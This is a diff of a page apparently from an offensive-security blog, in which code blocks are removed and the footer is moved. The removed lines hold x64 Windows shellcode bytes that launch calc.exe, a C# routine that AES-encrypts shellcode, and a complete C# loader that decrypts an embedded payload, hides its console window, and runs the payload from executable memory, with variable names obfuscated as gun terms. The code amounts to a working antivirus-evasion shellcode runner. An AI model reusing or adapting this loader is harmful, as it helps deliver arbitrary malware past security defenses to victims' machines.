-                        0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
-                        0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,
-                        0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,
-                        0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,
-                        0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,
-                        0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
-                        0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,
-                        0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,
-                        0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,
-                        0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
-                        0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
-                        0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,
-                        0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,
-                        0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,
-                        0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
-                        0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
-                        0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,
-                        0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,
-                        0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,
-                        0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,
-                        0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,
-                        0x63,0x2e,0x65,0x78,0x65,0x00};
-
-                        byte[] key = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes("MyK3yG0o0zH3r3")); // Change Password if needed
-                        byte[] shellcodeEncrypted = AES_Encrypt(buf, key);
-                        PrintShellcode(shellcodeEncrypted);
-                    }
-                }
-
-                </code></pre>
-            </details>
-            <details>
-                <summary class="text-[15px] text-gray-300 leading-relaxed sm:text-justify pl-2">C# AES Decryption Project</summary>
-                <pre>
-                <button class="copy-button" onclick="copyCode(this)">Copy</button>
-                <code class="language-csharp">
-                using System;
-                using System.IO;
-                using System.Runtime.InteropServices;
-                using System.Security.Cryptography;
-                using System.Text;
-
-                namespace AppDomainInvasion
-                {
-                    class Revolver
-                    {
-                        [DllImport("kernel32.dll", SetLastError = true)]
-                        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint Size, uint flAllocationType, uint flProtect);
-                        [DllImport("kernel32.dll")]
-                        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
-                        [DllImport("kernel32.dll")]
-                        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
-                        [DllImport("kernel32.dll")]
-                        static extern IntPtr GetConsoleWindow();
-                        [DllImport("user32.dll")]
-                        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-                        [DllImport("kernel32.dll")]
-                        static extern void Sleep(uint dwMilliseconds);
-                        public static byte[] SmokeScreen(byte[] rifle, byte[] ammo)
-                        {
-                            byte[] bullets = null;
-                            byte[] powder = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16 };
-                            using (MemoryStream magazine = new MemoryStream())
-                            {
-                                using (RijndaelManaged smoke = new RijndaelManaged())
-                                {
-                                    smoke.KeySize = 256;
-                                    smoke.BlockSize = 128;
-                                    var clip = new Rfc2898DeriveBytes(ammo, powder, 1000);
-                                    smoke.Key = clip.GetBytes(smoke.KeySize / 8);
-                                    smoke.IV = clip.GetBytes(smoke.BlockSize / 8);
-                                    smoke.Mode = CipherMode.CBC;
-                                    using (var target = new CryptoStream(magazine, smoke.CreateDecryptor(), CryptoStreamMode.Write))
-                                    {
-                                        target.Write(rifle, 0, rifle.Length);
-                                        target.Close();
-                                    }
-                                    bullets = magazine.ToArray();
-                                }
-                            }
-                            return bullets;
-                        }
-                        public static void Fire(byte[] round)
-                        {
-                            IntPtr barrel = VirtualAlloc(IntPtr.Zero, (UInt32)round.Length, 0x3000, 0x40);
-                            Marshal.Copy(round, 0, barrel, round.Length);
-                            IntPtr trigger = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
-                            IntPtr hammer = IntPtr.Zero;
-                            hammer = CreateThread(IntPtr.Zero, 0, barrel, IntPtr.Zero, 0, IntPtr.Zero);
-                            WaitForSingleObject(hammer, 0xFFFFFFFF);
-                        }
-                        public static void Execute()
-                        {
-                            var lockup = GetConsoleWindow();
-                            ShowWindow(lockup, 0);
-                            //Change this with your encryption data
-                            byte[] Enc = new byte[288] { 0x4f, 0xb4, 0xe8, 0xf9, 0xa5, 0xde, 0x46, 0x48, 0x31, 0xd3, 0xc2, 0x22, 0xb8, 0x36, 0x7f, 0xb8, 0xc1, 0x1f, 0x1f, 0x40, 0x86, 0x66, 0x7d, 0x7f, 0x15, 0xe0, 0x34, 0x3e, 0x31, 0x9a, 0xb9, 0x75, 0xca, 0xae, 0xed, 0x70, 0xa3, 0x4d, 0x5c, 0x89, 0x00, 0x85, 0xc3, 0x7a, 0xe6, 0xec, 0x1c, 0x8f, 0x35, 0x66, 0xec, 0x4f, 0xbc, 0xaa, 0xce, 0xb7, 0xbd, 0x94, 0x6e, 0x19, 0x1f, 0xd2, 0xdf, 0x4e, 0xb3, 0x22, 0x70, 0x1d, 0x6b, 0xa3, 0x3b, 0x4a, 0x9b, 0xa0, 0x26, 0x74, 0xe2, 0xd0, 0xed, 0x79, 0x34, 0xd2, 0x09, 0xc2, 0x48, 0x36, 0xf1, 0x0c, 0x5e, 0x64, 0xca, 0xc3, 0xed, 0x17, 0xca, 0x8b, 0x32, 0x96, 0xc7, 0xcc, 0x7c, 0xcb, 0x4c, 0xcd, 0x15, 0x53, 0x03, 0x09, 0xe4, 0x38, 0x40, 0x2d, 0x80, 0x66, 0xa1, 0x31, 0xda, 0x28, 0x42, 0x4a, 0xad, 0x34, 0xba, 0x49, 0xa9, 0x46, 0x61, 0x01, 0x59, 0x7b, 0x10, 0x11, 0x0c, 0x81, 0x09, 0x3c, 0x1c, 0x1a, 0xfe, 0xc8, 0xa9, 0x85, 0x3d, 0x6a, 0x30, 0xb5, 0x81, 0xb2, 0x3e, 0xd1, 0x77, 0x11, 0x5e, 0xac, 0x5e, 0x3a, 0x71, 0x97, 0x19, 0x24, 0xf2, 0xf3, 0xa4, 0x86, 0x5d, 0x1c, 0x0c, 0x5a, 0xd5, 0xae, 0x5d, 0xff, 0x53, 0x05, 0xe4, 0xa1, 0x96, 0xdd, 0x22, 0x6e, 0xa8, 0x17, 0x25, 0xc3, 0x25, 0xb9, 0xde, 0xd3, 0xe2, 0x76, 0xa5, 0x0f, 0x85, 0x91, 0x2e, 0xd9, 0xd9, 0xba, 0x00, 0x0f, 0x92, 0x97, 0x04, 0x25, 0x89, 0x27, 0x31, 0xbb, 0xe3, 0x81, 0x4d, 0xaa, 0x63, 0x78, 0xc3, 0x58, 0x76, 0x9a, 0x24, 0xf6, 0xb9, 0xb4, 0x1e, 0x92, 0x7a, 0xdb, 0xe5, 0xd5, 0xaa, 0xd0, 0xbc, 0xec, 0xbc, 0xd5, 0x82, 0xef, 0x0c, 0xec, 0x85, 0x05, 0x7b, 0xcf, 0xf2, 0xfe, 0xc7, 0xa8, 0x9f, 0xb9, 0xe5, 0x3d, 0xc9, 0xf7, 0xff, 0x72, 0xef, 0xc1, 0x56, 0x44, 0x40, 0xd4, 0x8d, 0x21, 0x19, 0x07, 0xe0, 0x05, 0x09, 0x6f, 0x94, 0x63, 0xcf, 0x85, 0x86, 0x03, 0x95, 0x13, 0x2b, 0x14, 0xc6, 0x1c, 0x82, 0x31, 0x34, 0xdd, 0x33, 0x9a, 0xd5, 0x72 };
-
-                            byte[] gunpowder = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes("MyK3yG0o0zH3r3")); //Change this
-                            Enc = SmokeScreen(Enc, gunpowder);
-                            Fire(Enc);
-
-                        }
-                        public static void Main(string[] args)
-                        {
-                            Execute();
-                        }
-                    }
-                }
-                </code></pre>
-            </details>
+              </script>     
     </section>
+    <footer class="flex flex-col items-center justify-center gap-4 py-6 bg-[#0f172a] text-gray-200">
+        <p class="text-center">2025 Iron Hulk — No rights reserved.</p>
+        <a href="../index.html" class="inline-block bg-blue-500 text-white text-sm px-4 py-2 rounded hover:bg-blue-600 transition">← Back to Dashboard</a>
+    </footer>
   </main>
-  <!-- Footer -->
-  <footer class="flex items-center justify-center py-6">
-    <a href="../index.html" class="inline-block bg-blue-500 text-white text-sm px-4 py-2 rounded hover:bg-blue-600 transition">← Back to Dashboard</a>
-  </footer>
-
   <!-- Reading-time logic -->
   <script>
     document.addEventListener('DOMContentLoaded', () => {
